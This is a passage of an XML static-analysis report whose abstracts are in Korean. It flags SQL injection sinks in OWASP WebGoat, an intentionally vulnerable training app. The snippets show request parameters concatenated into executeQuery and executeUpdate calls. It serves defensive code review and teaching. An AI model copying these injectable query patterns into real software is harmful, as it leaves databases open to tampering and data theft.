<Snippet>	String firstName = request.getParameter(CrossSiteScripting.FIRST_NAME);
	String lastName = request.getParameter(CrossSiteScripting.LAST_NAME);
	String ssn = request.getParameter(CrossSiteScripting.SSN);
	String title = request.getParameter(CrossSiteScripting.TITLE);
	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7BDD81B455000B4713391796B65D396B" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.java의 149 줄에서 login() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>149</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.first())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BBE29556D932B13101A93BDA3C9F9446" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BackDoors.java의 113 줄에서 concept1() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BackDoors.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BackDoors.java</FilePath>
<LineStart>113</LineStart>
<Snippet>		}

		ResultSet rs = statement.executeQuery(arrSQL[0]);
		if (rs.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4C2F0A022D42BDB810AB61020436E6EE" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BlindSqlInjection.java의 122 줄에서 createContent() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>122</LineStart>
<Snippet>			    ResultSet.TYPE_SCROLL_INSENSITIVE,
			    ResultSet.CONCUR_READ_ONLY);
		    ResultSet results = statement.executeQuery(query);

		    if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DECADC8CF18805DE8D393C1FF350A884" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>136</LineStart>
<Snippet>	String title = request.getParameter(CrossSiteScripting.TITLE);
	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);
	String address1 = request.getParameter(CrossSiteScripting.ADDRESS1);
	String address2 = request.getParameter(CrossSiteScripting.ADDRESS2);
	int manager = Integer.parseInt(request</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1BA016A253E02A521F93B3FE8326D3B6" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>151</LineStart>
<Snippet>		.getParameter(CrossSiteScripting.DISCIPLINARY_NOTES);
	String personalDescription = request
		.getParameter(CrossSiteScripting.DESCRIPTION);

	Employee employee = new Employee(subjectId, firstName, lastName, ssn,</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ADB2838EEF4321355CBA5524A2E21C12" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 382 줄에서 createEmployeeProfile_BACKUP() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>382</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>executeUpdate()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6F6AC2229DF8D02A530F051A6AD33967" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewDatabase.java의 90 줄에서 createContent() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewDatabase.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ViewDatabase.java</FilePath>
<LineStart>90</LineStart>
<Snippet>			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(sqlStatement
			.toString());

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="609AB6BC75F18101BAF34F183F5F90BB" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DOS_Login.java의 134 줄에서 createContent() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>134</LineStart>
<Snippet>				    + s.getUserName()
				    + "' )";
			    statement.executeUpdate(insertData1);
			}
			// check the total count of logins</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ECD88BA59A13D27920D89B9150B55964" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SqlNumericInjection.java의 130 줄에서 injectableQuery() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SqlNumericInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SqlNumericInjection.java</FilePath>
<LineStart>130</LineStart>
<Snippet>			ResultSet.TYPE_SCROLL_INSENSITIVE,
			ResultSet.CONCUR_READ_ONLY);
		ResultSet results = statement.executeQuery(query);

		if ((results != null) &amp;&amp; (results.first() == true))</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D6285BDE3B6367571257E12E7237E331" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>	HttpServletRequest request = s.getRequest();
	String firstName = request.getParameter(CrossSiteScripting.FIRST_NAME);
	String lastName = request.getParameter(CrossSiteScripting.LAST_NAME);
	String ssn = request.getParameter(CrossSiteScripting.SSN);
	String title = request.getParameter(CrossSiteScripting.TITLE);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BCA3D333363FC5AC917286E91F517058" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>131</LineStart>
<Snippet>
	HttpServletRequest request = s.getRequest();
	String firstName = request.getParameter(CrossSiteScripting.FIRST_NAME);
	String lastName = request.getParameter(CrossSiteScripting.LAST_NAME);
	String ssn = request.getParameter(CrossSiteScripting.SSN);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4C1FCFCA2C8B123EF5A2352B71C40263" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>143</LineStart>
<Snippet>	int salary = Integer.parseInt(request
		.getParameter(CrossSiteScripting.SALARY));
	String ccn = request.getParameter(CrossSiteScripting.CCN);
	int ccnLimit = Integer.parseInt(request
		.getParameter(CrossSiteScripting.CCN_LIMIT));</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B8EC49F42C1791942978ED0508097358" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>131</LineStart>
<Snippet>
	HttpServletRequest request = s.getRequest();
	String firstName = request.getParameter(CrossSiteScripting.FIRST_NAME);
	String lastName = request.getParameter(CrossSiteScripting.LAST_NAME);
	String ssn = request.getParameter(CrossSiteScripting.SSN);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F88C48ED63341D13C54050C71557B4B7" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.java의 192 줄에서 getEmployeeProfile_BACKUP() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>192</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="102133874B3B236067674F95CDA65378" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>140</LineStart>
<Snippet>	int manager = Integer.parseInt(request
		.getParameter(CrossSiteScripting.MANAGER));
	String startDate = request.getParameter(CrossSiteScripting.START_DATE);
	int salary = Integer.parseInt(request
		.getParameter(CrossSiteScripting.SALARY));</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A763A01AFCFA6EA768C7045BFF271909" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 176 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>176</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D1EF88605230D7F736402E17D85C0DCE" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.java의 191 줄에서 login_BACKUP() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>191</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.first())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EC5D2A161015138659834F595ABEC843" ruleID="4B673A45-9AD5-4CBA-945B-11A3702CDF57">
                            <Category>SQL Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 225 줄에서 changeEmployeeProfile_BACKUP() 메서드는 잠재적으로 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>225</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>executeQuery()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A17C4D04E1782E491588042AC8FE1D41" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 248 줄에서 changeEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>135</LineStart>
<Snippet>	String ssn = request.getParameter(CrossSiteScripting.SSN);
	String title = request.getParameter(CrossSiteScripting.TITLE);
	String phone = request.getParameter(CrossSiteScripting.PHONE_NUMBER);
	String address1 = request.getParameter(CrossSiteScripting.ADDRESS1);
	String address2 = request.getParameter(CrossSiteScripting.ADDRESS2);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CD2D57A971D7F45E4E5903C44BB03E13" ruleID="E04D3E1F-2D8C-400A-BB55-7DA143F987E3">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UpdateProfile.java의 340 줄에서 createEmployeeProfile() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>140</LineStart>
<Snippet>	int manager = Integer.parseInt(request
		.getParameter(CrossSiteScripting.MANAGER));
	String startDate = request.getParameter(CrossSiteScripting.START_DATE);
	int salary = Integer.parseInt(request
		.getParameter(CrossSiteScripting.SALARY));</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="722C045E93DFA161A8B0B9F3C11E00B5" ruleID="9B5F0161-88EC-4104-B70B-0182FEB53BF2">
                            <Category>SQL Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Challenge2Screen.java의 220 줄에서 doStage2() 메서드는 신뢰할 수 없는 소스에서 나온 입력을 사용하여 만들어진 SQL 쿼리를 호출합니다. 이 호출을 사용하여 공격자는 해당 문의 의미를 수정하거나 임의의 SQL 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
